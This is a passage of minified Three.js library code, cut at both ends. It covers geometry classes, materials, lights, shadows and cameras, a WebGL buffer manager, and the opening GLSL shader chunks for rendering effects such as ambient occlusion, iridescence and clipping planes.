u=0;u<i;u++)for(let v=0;v<n;v++){const x=h[u][v+1],S=h[u][v],E=h[u+1][v],A=h[u+1][v+1];(u!==0||a>0)&&f.push(x,S,A),(u!==i-1||l<Math.PI)&&f.push(S,E,A)}this.setIndex(f),this.setAttribute("position",new tn(y,3)),this.setAttribute("normal",new tn(_,3)),this.setAttribute("uv",new tn(g,2))}copy(e){return super.copy(e),this.parameters=Object.assign({},e.parameters),this}static fromJSON(e){return new Ep(e.radius,e.widthSegments,e.heightSegments,e.phiStart,e.phiLength,e.thetaStart,e.thetaLength)}}class Hl extends Zn{constructor(e=1,n=.4,i=12,s=48,r=Math.PI*2){super(),this.type="TorusGeometry",this.parameters={radius:e,tube:n,radialSegments:i,tubularSegments:s,arc:r},i=Math.floor(i),s=Math.floor(s);const a=[],o=[],l=[],c=[],h=new G,d=new G,p=new G;for(let f=0;f<=i;f++)for(let y=0;y<=s;y++){const _=y/s*r,g=f/i*Math.PI*2;d.x=(e+n*Math.cos(g))*Math.cos(_),d.y=(e+n*Math.cos(g))*Math.sin(_),d.z=n*Math.sin(g),o.push(d.x,d.y,d.z),h.x=e*Math.cos(_),h.y=e*Math.sin(_),p.subVectors(d,h).normalize(),l.push(p.x,p.y,p.z),c.push(y/s),c.push(f/i)}for(let f=1;f<=i;f++)for(let y=1;y<=s;y++){const _=(s+1)*f+y-1,g=(s+1)*(f-1)+y-1,u=(s+1)*(f-1)+y,v=(s+1)*f+y;a.push(_,g,v),a.push(g,u,v)}this.setIndex(a),this.setAttribute("position",new tn(o,3)),this.setAttribute("normal",new tn(l,3)),this.setAttribute("uv",new tn(c,2))}copy(e){return super.copy(e),this.parameters=Object.assign({},e.parameters),this}static fromJSON(e){return new Hl(e.radius,e.tube,e.radialSegments,e.tubularSegments,e.arc)}}class xM extends pi{constructor(e){super(e),this.isRawShaderMaterial=!0,this.type="RawShaderMaterial"}}class _M extends ao{constructor(e){super(),this.isMeshStandardMaterial=!0,this.type="MeshStandardMaterial",this.defines={STANDARD:""},this.color=new Xe(16777215),this.roughness=1,this.metalness=0,this.map=null,this.lightMap=null,this.lightMapIntensity=1,this.aoMap=null,this.aoMapIntensity=1,this.emissive=new Xe(0),this.emissiveIntensity=1,this.emissiveMap=null,this.bumpMap=null,this.bumpScale=1,this.normalMap=null,this.normalMapType=ny,this.normalScale=new Je(1,1),this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.roughnessMap=null,this.metalnessMap=null,this.alphaMap=null,this.envMap=null,this.envMapRotation=new hi,this.envMapIntensity=1,this.wireframe=!1,this.wireframeLinewidth=1,this.wireframeLinecap="round",this.wireframeLinejoin="round",this.flatShading=!1,this.fog=!0,this.setValues(e)}copy(e){return super.copy(e),this.defines={STANDARD:""},this.color.copy(e.color),this.roughness=e.roughness,this.metalness=e.metalness,this.map=e.map,this.lightMap=e.lightMap,this.lightMapIntensity=e.lightMapIntensity,this.aoMap=e.aoMap,this.aoMapIntensity=e.aoMapIntensity,this.emissive.copy(e.emissive),this.emissiveMap=e.emissiveMap,this.emissiveIntensity=e.emissiveIntensity,this.bumpMap=e.bumpMap,this.bumpScale=e.bumpScale,this.normalMap=e.normalMap,this.normalMapType=e.normalMapType,this.normalScale.copy(e.normalScale),this.displacementMap=e.displacementMap,this.displacementScale=e.displacementScale,this.displacementBias=e.displacementBias,this.roughnessMap=e.roughnessMap,this.metalnessMap=e.metalnessMap,this.alphaMap=e.alphaMap,this.envMap=e.envMap,this.envMapRotation.copy(e.envMapRotation),this.envMapIntensity=e.envMapIntensity,this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this.wireframeLinecap=e.wireframeLinecap,this.wireframeLinejoin=e.wireframeLinejoin,this.flatShading=e.flatShading,this.fog=e.fog,this}}class bM extends ao{constructor(e){super(),this.isMeshDepthMaterial=!0,this.type="MeshDepthMaterial",this.depthPacking=Lw,this.map=null,this.alphaMap=null,this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.wireframe=!1,this.wireframeLinewidth=1,this.setValues(e)}copy(e){return super.copy(e),this.depthPacking=e.depthPacking,this.map=e.map,this.alphaMap=e.alphaMap,this.displacementMap=e.displacementMap,this.displacementScale=e.displacementScale,this.displacementBias=e.displacementBias,this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this}}class SM extends ao{constructor(e){super(),this.isMeshDistanceMaterial=!0,this.type="MeshDistanceMaterial",this.map=null,this.alphaMap=null,this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.setValues(e)}copy(e){return super.copy(e),this.map=e.map,this.alphaMap=e.alphaMap,this.displacementMap=e.displacementMap,this.displacementScale=e.displacementScale,this.displacementBias=e.displacementBias,this}}class Tp extends $t{constructor(e,n=1){super(),this.isLight=!0,this.type="Light",this.color=new Xe(e),this.intensity=n}dispose(){this.dispatchEvent({type:"dispose"})}copy(e,n){return super.copy(e,n),this.color.copy(e.color),this.intensity=e.intensity,this}toJSON(e){const n=super.toJSON(e);return n.object.color=this.color.getHex(),n.object.intensity=this.intensity,n}}const yu=new St,Im=new G,Dm=new G;class fy{constructor(e){this.camera=e,this.intensity=1,this.bias=0,this.normalBias=0,this.radius=1,this.blurSamples=8,this.mapSize=new Je(512,512),this.mapType=_n,this.map=null,this.mapPass=null,this.matrix=new St,this.autoUpdate=!0,this.needsUpdate=!1,this._frustum=new Mp,this._frameExtents=new Je(1,1),this._viewportCount=1,this._viewports=[new bt(0,0,1,1)]}getViewportCount(){return this._viewportCount}getFrustum(){return this._frustum}updateMatrices(e){const n=this.camera,i=this.matrix;Im.setFromMatrixPosition(e.matrixWorld),n.position.copy(Im),Dm.setFromMatrixPosition(e.target.matrixWorld),n.lookAt(Dm),n.updateMatrixWorld(),yu.multiplyMatrices(n.projectionMatrix,n.matrixWorldInverse),this._frustum.setFromProjectionMatrix(yu,n.coordinateSystem,n.reversedDepth),n.reversedDepth?i.set(.5,0,0,.5,0,.5,0,.5,0,0,1,0,0,0,0,1):i.set(.5,0,0,.5,0,.5,0,.5,0,0,.5,.5,0,0,0,1),i.multiply(yu)}getViewport(e){return this._viewports[e]}getFrameExtents(){return this._frameExtents}dispose(){this.map&&this.map.dispose(),this.mapPass&&this.mapPass.dispose()}copy(e){return this.camera=e.camera.clone(),this.intensity=e.intensity,this.bias=e.bias,this.radius=e.radius,this.autoUpdate=e.autoUpdate,this.needsUpdate=e.needsUpdate,this.normalBias=e.normalBias,this.blurSamples=e.blurSamples,this.mapSize.copy(e.mapSize),this}clone(){return new this.constructor().copy(this)}toJSON(){const e={};return this.intensity!==1&&(e.intensity=this.intensity),this.bias!==0&&(e.bias=this.bias),this.normalBias!==0&&(e.normalBias=this.normalBias),this.radius!==1&&(e.radius=this.radius),(this.mapSize.x!==512||this.mapSize.y!==512)&&(e.mapSize=this.mapSize.toArray()),e.camera=this.camera.toJSON(!1).object,delete e.camera.matrix,e}}class wM extends fy{constructor(){super(new xn(90,1,.5,500)),this.isPointLightShadow=!0}}class MM extends Tp{constructor(e,n,i=0,s=2){super(e,n),this.isPointLight=!0,this.type="PointLight",this.distance=i,this.decay=s,this.shadow=new wM}get power(){return this.intensity*4*Math.PI}set power(e){this.intensity=e/(4*Math.PI)}dispose(){super.dispose(),this.shadow.dispose()}copy(e,n){return super.copy(e,n),this.distance=e.distance,this.decay=e.decay,this.shadow=e.shadow.clone(),this}toJSON(e){const n=super.toJSON(e);return n.object.distance=this.distance,n.object.decay=this.decay,n.object.shadow=this.shadow.toJSON(),n}}class Ap extends uy{constructor(e=-1,n=1,i=1,s=-1,r=.1,a=2e3){super(),this.isOrthographicCamera=!0,this.type="OrthographicCamera",this.zoom=1,this.view=null,this.left=e,this.right=n,this.top=i,this.bottom=s,this.near=r,this.far=a,this.updateProjectionMatrix()}copy(e,n){return super.copy(e,n),this.left=e.left,this.right=e.right,this.top=e.top,this.bottom=e.bottom,this.near=e.near,this.far=e.far,this.zoom=e.zoom,this.view=e.view===null?null:Object.assign({},e.view),this}setViewOffset(e,n,i,s,r,a){this.view===null&&(this.view={enabled:!0,fullWidth:1,fullHeight:1,offsetX:0,offsetY:0,width:1,height:1}),this.view.enabled=!0,this.view.fullWidth=e,this.view.fullHeight=n,this.view.offsetX=i,this.view.offsetY=s,this.view.width=r,this.view.height=a,this.updateProjectionMatrix()}clearViewOffset(){this.view!==null&&(this.view.enabled=!1),this.updateProjectionMatrix()}updateProjectionMatrix(){const e=(this.right-this.left)/(2*this.zoom),n=(this.top-this.bottom)/(2*this.zoom),i=(this.right+this.left)/2,s=(this.top+this.bottom)/2;let r=i-e,a=i+e,o=s+n,l=s-n;if(this.view!==null&&this.view.enabled){const c=(this.right-this.left)/this.view.fullWidth/this.zoom,h=(this.top-this.bottom)/this.view.fullHeight/this.zoom;r+=c*this.view.offsetX,a=r+c*this.view.width,o-=h*this.view.offsetY,l=o-h*this.view.height}this.projectionMatrix.makeOrthographic(r,a,o,l,this.near,this.far,this.coordinateSystem,this.reversedDepth),this.projectionMatrixInverse.copy(this.projectionMatrix).invert()}toJSON(e){const n=super.toJSON(e);return n.object.zoom=this.zoom,n.object.left=this.left,n.object.right=this.right,n.object.top=this.top,n.object.bottom=this.bottom,n.object.near=this.near,n.object.far=this.far,this.view!==null&&(n.object.view=Object.assign({},this.view)),n}}class EM extends fy{constructor(){super(new Ap(-5,5,5,-5,.5,500)),this.isDirectionalLightShadow=!0}}class TM extends Tp{constructor(e,n){super(e,n),this.isDirectionalLight=!0,this.type="DirectionalLight",this.position.copy($t.DEFAULT_UP),this.updateMatrix(),this.target=new $t,this.shadow=new EM}dispose(){super.dispose(),this.shadow.dispose()}copy(e){return super.copy(e),this.target=e.target.clone(),this.shadow=e.shadow.clone(),this}toJSON(e){const n=super.toJSON(e);return n.object.shadow=this.shadow.toJSON(),n.object.target=this.target.uuid,n}}class AM extends Tp{constructor(e,n){super(e,n),this.isAmbientLight=!0,this.type="AmbientLight"}}class CM extends xn{constructor(e=[]){super(),this.isArrayCamera=!0,this.isMultiViewCamera=!1,this.cameras=e}}class RM{constructor(e=!0){this.autoStart=e,this.startTime=0,this.oldTime=0,this.elapsedTime=0,this.running=!1}start(){this.startTime=performance.now(),this.oldTime=this.startTime,this.elapsedTime=0,this.running=!0}stop(){this.getElapsedTime(),this.running=!1,this.autoStart=!1}getElapsedTime(){return this.getDelta(),this.elapsedTime}getDelta(){let e=0;if(this.autoStart&&!this.running)return this.start(),0;if(this.running){const n=performance.now();e=(n-this.oldTime)/1e3,this.oldTime=n,this.elapsedTime+=e}return e}}function Um(t,e,n,i){const s=kM(i);switch(n){case Q0:return t*e;case ty:return t*e/s.components*s.byteLength;case gp:return t*e/s.components*s.byteLength;case Or:return t*e*2/s.components*s.byteLength;case vp:return t*e*2/s.components*s.byteLength;case ey:return t*e*3/s.components*s.byteLength;case qn:return t*e*4/s.components*s.byteLength;case yp:return t*e*4/s.components*s.byteLength;case cl:case ul:return Math.floor((t+3)/4)*Math.floor((e+3)/4)*8;case dl:case hl:return Math.floor((t+3)/4)*Math.floor((e+3)/4)*16;case Dd:case Od:return Math.max(t,16)*Math.max(e,8)/4;case Id:case Ud:return Math.max(t,8)*Math.max(e,8)/2;case Fd:case Bd:case Vd:case Hd:return Math.floor((t+3)/4)*Math.floor((e+3)/4)*8;case zd:case Gd:case Wd:return Math.floor((t+3)/4)*Math.floor((e+3)/4)*16;case jd:return Math.floor((t+3)/4)*Math.floor((e+3)/4)*16;case Xd:return Math.floor((t+4)/5)*Math.floor((e+3)/4)*16;case qd:return Math.floor((t+4)/5)*Math.floor((e+4)/5)*16;case Yd:return Math.floor((t+5)/6)*Math.floor((e+4)/5)*16;case $d:return Math.floor((t+5)/6)*Math.floor((e+5)/6)*16;case Kd:return Math.floor((t+7)/8)*Math.floor((e+4)/5)*16;case Zd:return Math.floor((t+7)/8)*Math.floor((e+5)/6)*16;case Jd:return Math.floor((t+7)/8)*Math.floor((e+7)/8)*16;case Qd:return Math.floor((t+9)/10)*Math.floor((e+4)/5)*16;case eh:return Math.floor((t+9)/10)*Math.floor((e+5)/6)*16;case th:return Math.floor((t+9)/10)*Math.floor((e+7)/8)*16;case nh:return Math.floor((t+9)/10)*Math.floor((e+9)/10)*16;case ih:return Math.floor((t+11)/12)*Math.floor((e+9)/10)*16;case sh:return Math.floor((t+11)/12)*Math.floor((e+11)/12)*16;case rh:case ah:case oh:return Math.ceil(t/4)*Math.ceil(e/4)*16;case lh:case ch:return Math.ceil(t/4)*Math.ceil(e/4)*8;case uh:case dh:return Math.ceil(t/4)*Math.ceil(e/4)*16}throw new Error(`Unable to determine texture byte length for ${n} format.`)}function kM(t){switch(t){case _n:case $0:return{byteLength:1,components:1};case Xa:case K0:case Ii:return{byteLength:2,components:1};case fp:case mp:return{byteLength:2,components:4};case di:case pp:case si:return{byteLength:4,components:1};case Z0:case J0:return{byteLength:4,components:3}}throw new Error(`Unknown texture type ${t}.`)}typeof __THREE_DEVTOOLS__<"u"&&__THREE_DEVTOOLS__.dispatchEvent(new CustomEvent("register",{detail:{revision:hp}}));typeof window<"u"&&(window.__THREE__?Ie("WARNING: Multiple instances of Three.js being imported."):window.__THREE__=hp);/**
 * @license
 * Copyright 2010-2025 Three.js Authors
 * SPDX-License-Identifier: MIT
 */function my(){let t=null,e=!1,n=null,i=null;function s(r,a){n(r,a),i=t.requestAnimationFrame(s)}return{start:function(){e!==!0&&n!==null&&(i=t.requestAnimationFrame(s),e=!0)},stop:function(){t.cancelAnimationFrame(i),e=!1},setAnimationLoop:function(r){n=r},setContext:function(r){t=r}}}function LM(t){const e=new WeakMap;function n(o,l){const c=o.array,h=o.usage,d=c.byteLength,p=t.createBuffer();t.bindBuffer(l,p),t.bufferData(l,c,h),o.onUploadCallback();let f;if(c instanceof Float32Array)f=t.FLOAT;else if(typeof Float16Array<"u"&&c instanceof Float16Array)f=t.HALF_FLOAT;else if(c instanceof Uint16Array)o.isFloat16BufferAttribute?f=t.HALF_FLOAT:f=t.UNSIGNED_SHORT;else if(c instanceof Int16Array)f=t.SHORT;else if(c instanceof Uint32Array)f=t.UNSIGNED_INT;else if(c instanceof Int32Array)f=t.INT;else if(c instanceof Int8Array)f=t.BYTE;else if(c instanceof Uint8Array)f=t.UNSIGNED_BYTE;else if(c instanceof Uint8ClampedArray)f=t.UNSIGNED_BYTE;else throw new Error("THREE.WebGLAttributes: Unsupported buffer data format: "+c);return{buffer:p,type:f,bytesPerElement:c.BYTES_PER_ELEMENT,version:o.version,size:d}}function i(o,l,c){const h=l.array,d=l.updateRanges;if(t.bindBuffer(c,o),d.length===0)t.bufferSubData(c,0,h);else{d.sort((f,y)=>f.start-y.start);let p=0;for(let f=1;f<d.length;f++){const y=d[p],_=d[f];_.start<=y.start+y.count+1?y.count=Math.max(y.count,_.start+_.count-y.start):(++p,d[p]=_)}d.length=p+1;for(let f=0,y=d.length;f<y;f++){const _=d[f];t.bufferSubData(c,_.start*h.BYTES_PER_ELEMENT,h,_.start,_.count)}l.clearUpdateRanges()}l.onUploadCallback()}function s(o){return o.isInterleavedBufferAttribute&&(o=o.data),e.get(o)}function r(o){o.isInterleavedBufferAttribute&&(o=o.data);const l=e.get(o);l&&(t.deleteBuffer(l.buffer),e.delete(o))}function a(o,l){if(o.isInterleavedBufferAttribute&&(o=o.data),o.isGLBufferAttribute){const h=e.get(o);(!h||h.version<o.version)&&e.set(o,{buffer:o.buffer,type:o.type,bytesPerElement:o.elementSize,version:o.version});return}const c=e.get(o);if(c===void 0)e.set(o,n(o,l));else if(c.version<o.version){if(c.size!==o.array.byteLength)throw new Error("THREE.WebGLAttributes: The size of the buffer attribute's array buffer does not match the original size. Resizing buffer attributes is not supported.");i(c.buffer,o,l),c.version=o.version}}return{get:s,remove:r,update:a}}var PM=`#ifdef USE_ALPHAHASH
	if ( diffuseColor.a < getAlphaHashThreshold( vPosition ) ) discard;
#endif`,NM=`#ifdef USE_ALPHAHASH
	const float ALPHA_HASH_SCALE = 0.05;
	float hash2D( vec2 value ) {
		return fract( 1.0e4 * sin( 17.0 * value.x + 0.1 * value.y ) * ( 0.1 + abs( sin( 13.0 * value.y + value.x ) ) ) );
	}
	float hash3D( vec3 value ) {
		return hash2D( vec2( hash2D( value.xy ), value.z ) );
	}
	float getAlphaHashThreshold( vec3 position ) {
		float maxDeriv = max(
			length( dFdx( position.xyz ) ),
			length( dFdy( position.xyz ) )
		);
		float pixScale = 1.0 / ( ALPHA_HASH_SCALE * maxDeriv );
		vec2 pixScales = vec2(
			exp2( floor( log2( pixScale ) ) ),
			exp2( ceil( log2( pixScale ) ) )
		);
		vec2 alpha = vec2(
			hash3D( floor( pixScales.x * position.xyz ) ),
			hash3D( floor( pixScales.y * position.xyz ) )
		);
		float lerpFactor = fract( log2( pixScale ) );
		float x = ( 1.0 - lerpFactor ) * alpha.x + lerpFactor * alpha.y;
		float a = min( lerpFactor, 1.0 - lerpFactor );
		vec3 cases = vec3(
			x * x / ( 2.0 * a * ( 1.0 - a ) ),
			( x - 0.5 * a ) / ( 1.0 - a ),
			1.0 - ( ( 1.0 - x ) * ( 1.0 - x ) / ( 2.0 * a * ( 1.0 - a ) ) )
		);
		float threshold = ( x < ( 1.0 - a ) )
			? ( ( x < a ) ? cases.x : cases.y )
			: cases.z;
		return clamp( threshold , 1.0e-6, 1.0 );
	}
#endif`,IM=`#ifdef USE_ALPHAMAP
	diffuseColor.a *= texture2D( alphaMap, vAlphaMapUv ).g;
#endif`,DM=`#ifdef USE_ALPHAMAP
	uniform sampler2D alphaMap;
#endif`,UM=`#ifdef USE_ALPHATEST
	#ifdef ALPHA_TO_COVERAGE
	diffuseColor.a = smoothstep( alphaTest, alphaTest + fwidth( diffuseColor.a ), diffuseColor.a );
	if ( diffuseColor.a == 0.0 ) discard;
	#else
	if ( diffuseColor.a < alphaTest ) discard;
	#endif
#endif`,OM=`#ifdef USE_ALPHATEST
	uniform float alphaTest;
#endif`,FM=`#ifdef USE_AOMAP
	float ambientOcclusion = ( texture2D( aoMap, vAoMapUv ).r - 1.0 ) * aoMapIntensity + 1.0;
	reflectedLight.indirectDiffuse *= ambientOcclusion;
	#if defined( USE_CLEARCOAT ) 
		clearcoatSpecularIndirect *= ambientOcclusion;
	#endif
	#if defined( USE_SHEEN ) 
		sheenSpecularIndirect *= ambientOcclusion;
	#endif
	#if defined( USE_ENVMAP ) && defined( STANDARD )
		float dotNV = saturate( dot( geometryNormal, geometryViewDir ) );
		reflectedLight.indirectSpecular *= computeSpecularOcclusion( dotNV, ambientOcclusion, material.roughness );
	#endif
#endif`,BM=`#ifdef USE_AOMAP
	uniform sampler2D aoMap;
	uniform float aoMapIntensity;
#endif`,zM=`#ifdef USE_BATCHING
	#if ! defined( GL_ANGLE_multi_draw )
	#define gl_DrawID _gl_DrawID
	uniform int _gl_DrawID;
	#endif
	uniform highp sampler2D batchingTexture;
	uniform highp usampler2D batchingIdTexture;
	mat4 getBatchingMatrix( const in float i ) {
		int size = textureSize( batchingTexture, 0 ).x;
		int j = int( i ) * 4;
		int x = j % size;
		int y = j / size;
		vec4 v1 = texelFetch( batchingTexture, ivec2( x, y ), 0 );
		vec4 v2 = texelFetch( batchingTexture, ivec2( x + 1, y ), 0 );
		vec4 v3 = texelFetch( batchingTexture, ivec2( x + 2, y ), 0 );
		vec4 v4 = texelFetch( batchingTexture, ivec2( x + 3, y ), 0 );
		return mat4( v1, v2, v3, v4 );
	}
	float getIndirectIndex( const in int i ) {
		int size = textureSize( batchingIdTexture, 0 ).x;
		int x = i % size;
		int y = i / size;
		return float( texelFetch( batchingIdTexture, ivec2( x, y ), 0 ).r );
	}
#endif
#ifdef USE_BATCHING_COLOR
	uniform sampler2D batchingColorTexture;
	vec3 getBatchingColor( const in float i ) {
		int size = textureSize( batchingColorTexture, 0 ).x;
		int j = int( i );
		int x = j % size;
		int y = j / size;
		return texelFetch( batchingColorTexture, ivec2( x, y ), 0 ).rgb;
	}
#endif`,VM=`#ifdef USE_BATCHING
	mat4 batchingMatrix = getBatchingMatrix( getIndirectIndex( gl_DrawID ) );
#endif`,HM=`vec3 transformed = vec3( position );
#ifdef USE_ALPHAHASH
	vPosition = vec3( position );
#endif`,GM=`vec3 objectNormal = vec3( normal );
#ifdef USE_TANGENT
	vec3 objectTangent = vec3( tangent.xyz );
#endif`,WM=`float G_BlinnPhong_Implicit( ) {
	return 0.25;
}
float D_BlinnPhong( const in float shininess, const in float dotNH ) {
	return RECIPROCAL_PI * ( shininess * 0.5 + 1.0 ) * pow( dotNH, shininess );
}
vec3 BRDF_BlinnPhong( const in vec3 lightDir, const in vec3 viewDir, const in vec3 normal, const in vec3 specularColor, const in float shininess ) {
	vec3 halfDir = normalize( lightDir + viewDir );
	float dotNH = saturate( dot( normal, halfDir ) );
	float dotVH = saturate( dot( viewDir, halfDir ) );
	vec3 F = F_Schlick( specularColor, 1.0, dotVH );
	float G = G_BlinnPhong_Implicit( );
	float D = D_BlinnPhong( shininess, dotNH );
	return F * ( G * D );
} // validated`,jM=`#ifdef USE_IRIDESCENCE
	const mat3 XYZ_TO_REC709 = mat3(
		 3.2404542, -0.9692660,  0.0556434,
		-1.5371385,  1.8760108, -0.2040259,
		-0.4985314,  0.0415560,  1.0572252
	);
	vec3 Fresnel0ToIor( vec3 fresnel0 ) {
		vec3 sqrtF0 = sqrt( fresnel0 );
		return ( vec3( 1.0 ) + sqrtF0 ) / ( vec3( 1.0 ) - sqrtF0 );
	}
	vec3 IorToFresnel0( vec3 transmittedIor, float incidentIor ) {
		return pow2( ( transmittedIor - vec3( incidentIor ) ) / ( transmittedIor + vec3( incidentIor ) ) );
	}
	float IorToFresnel0( float transmittedIor, float incidentIor ) {
		return pow2( ( transmittedIor - incidentIor ) / ( transmittedIor + incidentIor ));
	}
	vec3 evalSensitivity( float OPD, vec3 shift ) {
		float phase = 2.0 * PI * OPD * 1.0e-9;
		vec3 val = vec3( 5.4856e-13, 4.4201e-13, 5.2481e-13 );
		vec3 pos = vec3( 1.6810e+06, 1.7953e+06, 2.2084e+06 );
		vec3 var = vec3( 4.3278e+09, 9.3046e+09, 6.6121e+09 );
		vec3 xyz = val * sqrt( 2.0 * PI * var ) * cos( pos * phase + shift ) * exp( - pow2( phase ) * var );
		xyz.x += 9.7470e-14 * sqrt( 2.0 * PI * 4.5282e+09 ) * cos( 2.2399e+06 * phase + shift[ 0 ] ) * exp( - 4.5282e+09 * pow2( phase ) );
		xyz /= 1.0685e-7;
		vec3 rgb = XYZ_TO_REC709 * xyz;
		return rgb;
	}
	vec3 evalIridescence( float outsideIOR, float eta2, float cosTheta1, float thinFilmThickness, vec3 baseF0 ) {
		vec3 I;
		float iridescenceIOR = mix( outsideIOR, eta2, smoothstep( 0.0, 0.03, thinFilmThickness ) );
		float sinTheta2Sq = pow2( outsideIOR / iridescenceIOR ) * ( 1.0 - pow2( cosTheta1 ) );
		float cosTheta2Sq = 1.0 - sinTheta2Sq;
		if ( cosTheta2Sq < 0.0 ) {
			return vec3( 1.0 );
		}
		float cosTheta2 = sqrt( cosTheta2Sq );
		float R0 = IorToFresnel0( iridescenceIOR, outsideIOR );
		float R12 = F_Schlick( R0, 1.0, cosTheta1 );
		float T121 = 1.0 - R12;
		float phi12 = 0.0;
		if ( iridescenceIOR < outsideIOR ) phi12 = PI;
		float phi21 = PI - phi12;
		vec3 baseIOR = Fresnel0ToIor( clamp( baseF0, 0.0, 0.9999 ) );		vec3 R1 = IorToFresnel0( baseIOR, iridescenceIOR );
		vec3 R23 = F_Schlick( R1, 1.0, cosTheta2 );
		vec3 phi23 = vec3( 0.0 );
		if ( baseIOR[ 0 ] < iridescenceIOR ) phi23[ 0 ] = PI;
		if ( baseIOR[ 1 ] < iridescenceIOR ) phi23[ 1 ] = PI;
		if ( baseIOR[ 2 ] < iridescenceIOR ) phi23[ 2 ] = PI;
		float OPD = 2.0 * iridescenceIOR * thinFilmThickness * cosTheta2;
		vec3 phi = vec3( phi21 ) + phi23;
		vec3 R123 = clamp( R12 * R23, 1e-5, 0.9999 );
		vec3 r123 = sqrt( R123 );
		vec3 Rs = pow2( T121 ) * R23 / ( vec3( 1.0 ) - R123 );
		vec3 C0 = R12 + Rs;
		I = C0;
		vec3 Cm = Rs - T121;
		for ( int m = 1; m <= 2; ++ m ) {
			Cm *= r123;
			vec3 Sm = 2.0 * evalSensitivity( float( m ) * OPD, float( m ) * phi );
			I += Cm * Sm;
		}
		return max( I, vec3( 0.0 ) );
	}
#endif`,XM=`#ifdef USE_BUMPMAP
	uniform sampler2D bumpMap;
	uniform float bumpScale;
	vec2 dHdxy_fwd() {
		vec2 dSTdx = dFdx( vBumpMapUv );
		vec2 dSTdy = dFdy( vBumpMapUv );
		float Hll = bumpScale * texture2D( bumpMap, vBumpMapUv ).x;
		float dBx = bumpScale * texture2D( bumpMap, vBumpMapUv + dSTdx ).x - Hll;
		float dBy = bumpScale * texture2D( bumpMap, vBumpMapUv + dSTdy ).x - Hll;
		return vec2( dBx, dBy );
	}
	vec3 perturbNormalArb( vec3 surf_pos, vec3 surf_norm, vec2 dHdxy, float faceDirection ) {
		vec3 vSigmaX = normalize( dFdx( surf_pos.xyz ) );
		vec3 vSigmaY = normalize( dFdy( surf_pos.xyz ) );
		vec3 vN = surf_norm;
		vec3 R1 = cross( vSigmaY, vN );
		vec3 R2 = cross( vN, vSigmaX );
		float fDet = dot( vSigmaX, R1 ) * faceDirection;
		vec3 vGrad = sign( fDet ) * ( dHdxy.x * R1 + dHdxy.y * R2 );
		return normalize( abs( fDet ) * surf_norm - vGrad );
	}
#endif`,qM=`#if NUM_CLIPPING_PLANES > 0
	vec4 plane;
	#ifdef ALPHA_TO_COVERAGE
		float distanceToPlane, distanceGradient;
		float clipOpacity = 1.0;
		#pragma unroll_loop_start
		for ( int i = 0; i < UNION_CLIPPING_PLANES; i ++ ) {
			plane = clippingPlanes[ i ];
			distanceToPlane = - dot( vClipPosition, plane.xyz ) + plane.w;
			distanceGradient = fwidth( distanceToPlane ) / 2.0;
			clipOpacity *= smoothstep( - distanceGradient, distanceGradient, distanceToPlane );
			if ( clipOpacity == 0.0 ) discard;
		}
		#pragma unroll_loop_end
		#if UNION_CLIPPING_PLANES < NUM_CLIPPING_PLANES
			float unionClipOpacity = 1.0;
			#pragma unroll_loop_start
			for ( int i = UNION_CLIPPING_PLANES; i < NUM_CLIPPING_PLANES; i ++ ) {
				plane = clippingPlanes[ i ];
				distanceToPlane = - dot( vClipPosition, plane.xyz ) + plane.w;
				distanceGradient = fwidth( distanceToPlane ) / 2.0;
				unionClipOpacity *= 1.0 - smoothstep( - distanceGradient, distanceGradient, distanceToPlane );
			}
			#pragma unroll_loop_end
			clipOpacity *= 1.0 - unionClipOpacity;
		#endif
		diffuseColor.a *= clipOpacity;
		if ( diffuseColor.a == 0.0 ) discard;
	#else
		#pragma unroll_loop_start
		for ( int i = 0; i < UNION_CLIPPING_PLANES; i ++ ) {
			plane = clippingPlanes[ i ];
			if ( dot( vClipPosition, plane.xyz ) > plane.w ) discard;
		}
		#pragma unroll_loop_end
		#if UNION_CLIPPING_PLANES < NUM_CLIPPING_PLANES
			bool clipped = true;
			#pragma unroll_loop_start
			for ( int i = UNION_CLIPPING_PLANES; i < NUM_CLIPPING_PLANES; i ++ ) {
				plane = clippingPlanes[ i ];
				clipped = ( dot( vClipPosition, plane.xyz ) > plane.w ) && clipped;
			}
			#pragma unroll_loop_end
			if ( clipped ) discard;
		#endif
	#endif
#endif`,YM=`#if NUM_CLIPPING_PLANES > 0
	varying vec3 vClipPosition;
	uniform vec4 clippingPlanes[ NUM_CLIPPING_PLANES ];
#endif`,$M=`#if NUM_CLIPPING_PLANES > 0
	varying vec3 vClipPosition;
#endif`,KM=`#if NUM_CLIPPING_PLANES > 0
	vClipPosition = - mvPosition.xyz;
#endif`,ZM=`#if defined( USE_COLOR_ALPHA )
	diffuseColor *= vColor;
#elif defined( USE_COLOR )
	diffuseColor.rgb *= vColor;
#endif`,JM=`#if defined( USE_COLOR_ALPHA )
	varying vec4 vColor;
#elif defined( USE_COLOR )
	varying vec3 vColor;
#endif`,QM=`#if defined( USE_COLOR_ALPHA )
	varying vec4 vColor;
#elif defined( USE_COLOR ) || defined( USE_INSTANCING_COLOR ) || defined( USE_BATCHING_COLOR )
	varying vec3 vColor;
#endif`,eE=`#if defined( USE_COLOR_ALPHA )
	vColor = vec4( 1.0 );
#elif defined( USE_COLOR ) || defined( USE_INSTANCING_COLOR ) || defined( USE_BATCHING_COLOR )
	vColor = vec3( 1.0 );
#endif
#ifdef USE_COLOR
	vColor *= color;
#endif
#ifdef USE_INSTANCING_COLOR
	vColor.xyz *= instanceColor.xyz;
#endif
#ifdef USE_BATCHING_COLOR
	vec3 batchingColor = getBatchingColor( getIndirectIndex( gl_DrawID ) );
	vColor.xyz *= batchingColor.xyz;
#endif`,tE=`#define PI 3.141592653589793
#define PI2 6.283185307179586
#define PI_HALF 1.5707963267948966
#define RECIPROCAL_PI 0.3183098861837907
#define RECIPROCAL_PI2 0.15915494309189535
#define EPSILON 1e-6
#ifndef saturate
#define saturate( a ) clamp( a, 0.0, 1.0 )
#endif
#define whiteComplement( a ) ( 1.0 - saturate( a ) )
float pow2( const in float x ) { return x*x; }
vec3 pow2( const in vec3 x ) { return x*x; }
float pow3( const in float x ) { return x*x*x; }
float pow4( const in float x ) { float x2 = x*x; return x2*x2; }
float max3( const in vec3 v ) { return max( max( v.x, v.y ), v.z ); }
float average( const in vec3 v ) { return dot( v, vec3( 0.3333333 ) ); }
highp float rand( const in vec2 uv ) {
	const highp float a = 12.9898, b = 78.233, c = 43758.5453;
